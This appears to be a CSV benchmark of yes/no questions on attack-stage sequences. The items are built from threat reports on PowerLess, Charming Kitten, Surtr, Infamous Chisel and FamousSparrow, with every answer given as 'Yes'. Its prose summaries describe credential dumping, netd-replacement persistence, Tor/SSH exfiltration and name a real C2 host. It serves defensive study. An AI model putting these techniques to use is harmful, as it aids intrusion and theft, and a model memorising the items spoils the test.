152,118,118-Discovery-T1087-Account Discovery,"After the PowerLess Backdoor achieves credential access by dumping OS credentials using 'Comsvcs.dll' and utilizing a keylogger, is it likely that it will target local user accounts on compromised systems for account discovery as part of its capability?","Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.
Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage
157,118,118-Lateral Movement-T1210-Exploitation of Remote Services,"After exploiting Microsoft Exchange Server vulnerabilities to gain initial access and executing PowerShell code within a .NET application to evade detection, is it likely that the attackers will dump credentials before moving laterally within the network using the PowerLess Backdoor?","Lateral Movement: After exploiting the Microsoft Exchange Server, the attackers used the PowerLess Backdoor to run reconnaissance commands and create persistence. They then dumped credentials and attempted to move laterally within the network.","Initial Access: The Cybereason Nocturnus Team reported that the Phosphorus group exploited the Microsoft Exchange Server vulnerabilities known as ProxyShell to gain initial access to target networks. This enabled the deployment of malware, including the PowerLess Backdoor.
Execution: The PowerLess Backdoor, developed by the Phosphorus group, executes PowerShell code within a .NET application context, avoiding the launch of 'powershell.exe' and thus evading detection by security products. The backdoor supports downloading additional payloads, such as a keylogger and an info stealer, and can execute arbitrary commands and kill processes.
Persistence: The PowerLess Backdoor creates persistence through scheduled tasks. The malware loader 'WindowsProcesses.exe' uses the Registry RunKeys or Startup Folder for boot or logon autostart execution. Additionally, the malware uses server software components like web shells for persistence.
Defense Evasion: The Phosphorus group's PowerLess Backdoor evades detection by running PowerShell within a .NET application, not spawning 'powershell.exe'. The group also impairs defenses by disabling or modifying system firewalls and modifies the registry to aid in defense evasion.
Credential Access: The PowerLess Backdoor includes a keylogger module that captures user input, effectively accessing credentials. Additionally, OS credential dumping is performed using known LOLBIN techniques, such as leveraging 'Comsvcs.dll'.
Discovery: The Phosphorus group's PowerLess Backdoor has the capability to perform account discovery, specifically targeting local accounts on compromised systems.
Collection: The PowerLess Backdoor is capable of archiving collected data, including stealing browser data and keylogging information. The data is stored in paths such as 'C:\Windows\Temp\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK' and 'C:\Windows\Temp\cup.tmp'.
Command and Control: The PowerLess Backdoor communicates with a command and control (C2) server using web protocols and encrypted channels that employ symmetric cryptography. The backdoor also uses proxy techniques for C2 communication.
Others: The Phosphorus group, also known as APT35 or Charming Kitten, has been active in cyber espionage and offensive cyber attacks, operating in the interest of the Iranian regime. The group has targeted various sectors, including medical research, academia, human rights, and media, and has interfered with the US presidential elections. The Cybereason Nocturnus Team discovered a new set of tools developed by Phosphorus, including the PowerLess Backdoor, malware loaders, a browser info stealer, and a keylogger. The group has also been observed using open-source tools such as DiskCryptor, BitLocker, and Fast Reverse Proxy for RDP proxying. Connections were found between Phosphorus and the Memento Ransomware, suggesting a potential shift towards ransomware operations. The research emphasizes the importance of following the breadcrumbs, such as pivoting on known infrastructure or PDB paths, to uncover additional tools and connections to other operations.",Yes,PowerLess Trojan_ Iranian APT Phosphorus Adds New PowerShell Backdoor for Espionage
163,119,119-Resource Development-T1583-Acquire Infrastructure,"After conducting reconnaissance through spear-phishing emails and SMS messages to gather sensitive information such as phone numbers for password recovery and two-factor authentication, is it likely that Charming Kitten will proceed to acquire infrastructures by developing phishing sites that impersonate legitimate services like Google Drive, Yahoo, Instagram, Facebook, and Twitter before leveraging them to gain initial access through credential-stealing spear-phishing attacks?","Resource Development: Charming Kitten has developed resources for their campaign by creating phishing sites that impersonate legitimate services such as Google Drive, Yahoo, and social networks like Instagram, Facebook, and Twitter. They have also prepared ZIP files with ready infrastructures for phishing sites using WordPress and CrunchPress interfaces, containing relevant files such as logos and personas to impersonate.","Reconnaissance: The Charming Kitten campaign, attributed to an Iranian APT group, has been actively engaging in reconnaissance by leveraging various impersonation vectors to target individuals of interest to Iran. These individuals include academic researchers, human rights activists, opposition to Iran's regime, journalists, and prominent Iranians living abroad. The campaign has utilized spear-phishing emails and SMS messages to gather information such as phone numbers for password recovery and two-factor authentication, aiming to gain control of the victims' email accounts.
Initial Access: Charming Kitten has gained initial access through spear-phishing methods, including emails and SMS messages impersonating Google Drive, Yahoo services, and social networks. They have sent messages from seemingly known contacts or services, prompting victims to click on malicious links that lead to phishing sites designed to steal credentials.
Defense Evasion: To evade detection, Charming Kitten has used tactics such as redirecting victims to legitimate services after an attack, using self-signed digital certificates for phishing sites, and employing domain shortening services to conceal the actual malicious URLs.
Credential Access: Charming Kitten's primary goal has been to access credentials by directing victims to phishing pages that impersonate login pages for services like Google Drive and Yahoo. The victims are manipulated into entering their credentials, believing they are accessing legitimate services.
Others: Charming Kitten has been associated with the Ministry of Intelligence of Iran and has been active since 2014. The group has been known to target various entities, including U.S. presidential campaigns, government officials, and journalists. They have also been involved in campaigns to interfere with democratic procedures, historically attributed to Russian APT groups. ClearSky Security Ltd has been monitoring Charming Kitten's activities and has identified new domains and IPs associated with the group's infrastructure, indicating ongoing efforts to target Yahoo accounts and impersonate services such as Microsoft.",Yes,The-Kittens-Are-Back-in-Town-2
171,12,12-Command and Control-T1104-Multi-Stage Channels,"After 'Surtr' discovers file directories and contents on the victim's system and creates folders for storing temporary information such as file listings and keylogger output, is it likely that 'Surtr' will connect to a command and control server (C2) and download a stage two component to a specific directory?","Command and Control: 'Surtr' connects to a command and control server (C2) and downloads a stage two component to a specific directory. The sample analyzed connects to internet.3-a.net on port 9696. In May 2012, this domain resolved to the same IP as another domain used in Android malware attacks targeting the Tibetan community.","Initial Access: The Citizen Lab analyzed a malicious email sent to Tibetan organizations in June 2013, which appeared to be from a prominent member of the Tibetan community and contained repurposed content from a community mailing list. The email had three attachments that seemed to be Microsoft Word documents (.doc) but were actually trojaned with a malware family named 'Surtr'. All three attachments dropped the same malware, which has been used in attacks on Tibetan groups since November 2012.
Execution: The 'Surtr' malware creates a new explorer or iexplore process and injects itself into this new process using the CreateRemoteThread function.
Persistence: For persistence, 'Surtr' adds a key to the registry to ensure it runs when the infected computer is restarted. It also stores its command and control (C2) information and a campaign code in the registry. Depending on the configuration, 'Surtr' will either create multiple registry keys in Software\Microsoft\Windows Media in HKU (hkey users) with text data or a single key called XC consisting of binary data, usually xor encrypted with a key of 0x1.
Defense Evasion: The 'Surtr' malware uses a vulnerability in Microsoft Word (CVE-2012-0158) to execute malicious code. Despite the vulnerability being known since April 2012 and a patch released by Microsoft, the malware was initially detected by only three antivirus engines, highlighting the need for up-to-date systems and applications. The malware also attempts to evade antivirus heuristics by padding the resource section with varying amounts of 00 bytes, resulting in a much larger file size (30-50mb).
Discovery: 'Surtr' has capabilities including listing file directories and contents on the victim computer and any USB drives connected, viewing web cache, executing remote commands, and logging keystrokes. It creates folders to store temporary information such as file and directory listings and keylogger output, which is disguised by adding a constant to the ordinal value of the character.
Others: The Citizen Lab's research into 'Surtr' malware targeting the Tibetan community reveals that the malware monitors mailing lists and discussion groups to repurpose content for targeted attacks. The malware can download additional components, such as 'GmRemote' or 'LURK0', which can provide attackers with further abilities like accessing the victim computer's webcam or microphone. 'Surtr' has been used in conjunction with the Gh0st RAT derived 'LURK0' malware. The Citizen Lab continues to monitor targeted malware campaigns using 'Surtr' and will post updates as available.",Yes,Surtr_Malware_Tibetan
177,120,120-Persistence-T1554-Compromise Client Software Binary,"After executing shell scripts as the root user of the device for privilege escalation, is it likely that the Infamous Chisel malware will persist on the system by replacing the legitimate netd system binary, checking if init is the parent process, and executing the legitimate process backed up at /system/bin/netd_?","Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
179,120,120-Command and Control-T1095-Non-Application Layer Protocol,"After performing discovery activities like enumerating multiple data directories and performing IP scanning of the local network with the netd component, is Infamous Chisel likely to leverage its Command and Control capabilities such as providing SCP functionality, a local Socks connection, and an SSH server and client?","Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
182,120,120-Credential Access-T1040-Network Sniffing,"After using the netd component to discover files of interest from data directories and performing activities such as GPS information collection, is it likely that Infamous Chisel will deploy tcpdump to sniff network interfaces and monitor network traffic before exfiltrating files at regular intervals using a Tor hidden service and SSH connections?","Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
184,120,120-Discovery-T1083-File and Directory Discovery,"After persisting by replacing the legitimate netd system binary at the path /system/bin/netd, is Infamous Chisel likely to perform file and directory discovery by enumerating data directories before collecting files from local systems and application directories containing communication data?","Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
186,120,120-Discovery-T1518-Software Discovery,"After persistently replacing the legitimate netd binary to inherit root privileges and executing shell scripts as the root user for privilege escalation, is it likely that Infamous Chisel's netd component will list installed packages as part of its software discovery before collecting files from application and data directories containing communication data?","Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
189,120,120-Collection-T1119-Automated Collection,"After the Infamous Chisel's netd component enumerates multiple directories and gathers system information during the discovery phase, is it likely that the component will automatically collect files from local systems based on a predefined list of file extensions during the collection phase?",Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.,"Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
190,120,120-Exfiltration-T1020-Automated Exfiltration,"After collecting files from application and data directories containing communication data, is Infamous Chisel likely to automatically exfiltrate these files at regular intervals using a Tor hidden service followed by SSH connections?",Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.,"Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
191,120,120-Exfiltration-T1029-Scheduled Transfer,"After Infamous Chisel automatically collects files based on a predefined list of file extensions and gathers files from application and data directories in the Collection phase, is it likely that its netd component will exfiltrate the collected files by using a Tor hidden service and SSH connections in the Exfiltration phase?",Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.,"Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.",Yes,NCSC-MAR-Infamous-Chisel
192,120,120-Impact-T1489-Service Stop,"After the Infamous Chisel malware automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections, is it likely that it will impact the system by replacing the legitimate netd service?","Impact: Infamous Chisel replaces the legitimate netd, potentially impacting the service.","Execution: Infamous Chisel is a collection of components targeting Android devices, associated with Sandworm activity. It includes a multi-call binary with utilities like dropbear, dropbearkey, ssh, scp, nmap, dbclient, watchdog, rmflag, mkflag, and is capable of executing shell scripts as the root user of the device. The malware replaces the legitimate netd and is executed by init, inheriting root privileges.
Persistence: Infamous Chisel persists on the system by replacing the legitimate netd system binary at the path /system/bin/netd. The malicious netd checks if init is the parent process and executes the legitimate process backed up at /system/bin/netd_, allowing the malicious netd to execute as root.
Privilege Escalation: Infamous Chisel replaces the legitimate netd and is executed by init, inheriting root privileges. It executes shell scripts as the root user of the device.
Defense Evasion: Infamous Chisel's blob decompresses executables from bzip archives. The malware checks that it is executed by init and at the path for the legitimate netd, impairing defenses by ensuring it is run as intended.
Credential Access: Infamous Chisel scrapes multiple files containing credentials and key information. It deploys tcpdump alongside the malware, which has the ability to sniff network interfaces and monitor network traffic.
Discovery: Infamous Chisel's netd component enumerates multiple data directories to discover files of interest, collects GPS information, lists installed packages, and gathers various system information such as the Android ID and other hardware information. It also performs IP scanning of the local network to discover other devices.
Collection: Infamous Chisel's netd component automatically collects files from the local system based on a predefined list of file extensions. It also collects files from application and data directories containing communication data.
Command and Control: Infamous Chisel's db component provides SCP functionality, and td is deployed alongside the malware providing a Tor hidden service relaying connections to SSH program. The malware also provides a local Socks connection for db, and db provides a SSH server and client.
Exfiltration: Infamous Chisel's netd component automatically exfiltrates files at regular intervals using a Tor hidden service and SSH connections.",Yes,NCSC-MAR-Infamous-Chisel
193,121,121-Initial Access-T1190-Exploit Public-Facing Application,"Is it likely that FamousSparrow will acquire domains and servers as infrastructure from providers such as Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY during Resource Development before gaining Initial Access by exploiting public-facing applications such as Microsoft Exchange, SharePoint, and Oracle Opera?","Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.","Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
194,121,121-Command and Control-T1573-Encrypted Channel,"After exploiting remote code execution vulnerabilities in internet-facing applications for Initial Access and running cmd.exe commands to execute SparrowDoor for Execution, is it likely that SparrowDoor will communicate with the C&C server via an encrypted HTTPS channel for Command and Control?","Command and Control: For Command and Control, SparrowDoor communicated with the C&C server using the HTTPS protocol and encrypted/decrypted communications with different multi-byte XOR keys.","Resource Development: The CTI report indicates that the cyberespionage group FamousSparrow engaged in Resource Development by exploiting known remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera. They used these vulnerabilities to drop various malicious samples. The group also acquired infrastructure such as domains and servers from Hosting Concepts, Shanghai Ruisu Network Technology, and DAOU TECHNOLOGY.
Initial Access: FamousSparrow gained Initial Access by exploiting remote code execution vulnerabilities in Microsoft Exchange, SharePoint, and Oracle Opera, which are internet-facing applications.
Execution: For Execution, FamousSparrow utilized cmd.exe to run commands for downloading and installing the SparrowDoor backdoor. They also exploited the same vulnerabilities used for initial access to execute SparrowDoor on the compromised systems.
Persistence: FamousSparrow achieved Persistence by creating a registry Run key entry for SparrowDoor and installing it as a service named WSearchIndex. Additionally, they used DLL search order hijacking to load the malicious K7UI.dll.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by FamousSparrow.
Defense Evasion: FamousSparrow employed Defense Evasion tactics by injecting the encrypted shellcode MpSvc.dll into processes. They also attempted to adjust token privileges to obtain SeDebugPrivilege and obfuscated files or information, including the shellcode and configuration data within SparrowDoor.
Credential Access: FamousSparrow used a custom version of Mimikatz for Credential Access, aiming to dump credentials from the compromised systems.
Discovery: In the Discovery phase, SparrowDoor collected system information such as usernames, computer names, RDP session IDs, and drive types. It also probed files in specified directories to obtain their names, attributes, sizes, and last modified times.
Collection: FamousSparrow's Collection tactics included the ability to read file contents and exfiltrate them to the C&C server.
Exfiltration: FamousSparrow exfiltrated data over the C&C channel using SparrowDoor.",Yes,FamousSparrow_ A suspicious hotel guest _ WeLiveSecurity
